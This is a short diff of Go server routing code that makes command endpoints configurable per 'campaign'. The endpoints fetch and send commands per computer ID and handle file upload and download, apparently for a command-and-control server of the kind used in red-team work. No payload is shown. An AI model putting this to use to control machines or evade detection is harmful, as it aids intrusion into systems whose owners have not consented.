@@ -60,15 +60,15 @@ func (s *Server) Serve() {
 	// Client Authenticated
 	clientRouter := myRouter.PathPrefix("/").Subrouter()
 	clientRouter.Use(GetClientMiddleware(s.campgain.ApiKey))
-	clientRouter.HandleFunc("/getCommand/{computerId}", s.getCommand)
-	clientRouter.HandleFunc("/sendCommand", s.sendCommand)
+	clientRouter.HandleFunc(s.campgain.CommandGetPath+"{computerId}", s.getCommand) // /getCommand/{computerId}
+	clientRouter.HandleFunc(s.campgain.CommandSendPath, s.sendCommand)              // /sendCommand
 
 	// No Authentication
 	// only via packetId:
-	myRouter.HandleFunc("/upload/{packetId}", s.uploadFile)
+	myRouter.HandleFunc(s.campgain.CommandFileUploadPath+"{packetId}", s.uploadFile) // /upload/{packetId}
 	// just use random filenames:
-	myRouter.PathPrefix("/static").Handler(http.StripPrefix("/static/",
-		http.FileServer(http.Dir("./static/"))))
+	myRouter.PathPrefix(s.campgain.CommandFileDownloadPath).Handler(
+		http.StripPrefix(s.campgain.CommandFileDownloadPath, http.FileServer(http.Dir("./static/")))) // /static
 
 	// Allow CORS
 	corsObj := handlers.AllowedOrigins([]string{"*"})
